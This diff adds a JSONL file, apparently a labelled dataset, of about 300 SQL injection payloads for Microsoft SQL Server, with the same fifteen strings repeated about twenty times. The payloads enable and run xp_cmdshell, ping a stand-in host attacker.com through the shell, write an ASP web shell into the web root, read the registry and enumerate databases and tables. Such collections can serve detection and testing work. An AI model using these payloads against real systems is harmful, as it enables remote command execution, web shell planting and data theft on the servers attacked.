@@ -1,0 +1,300 @@
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSgetversion--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\shell.asp', 'SELECT * FROM users'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\\inetpub\\wwwroot\\shell.asp', TRUE;--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_who--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_helpdb--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_configure--", "attack_type": "SQLI"}
+{"payload": "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--", "attack_type": "SQLI"}
+{"payload": "'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--", "attack_type": "SQLI"}
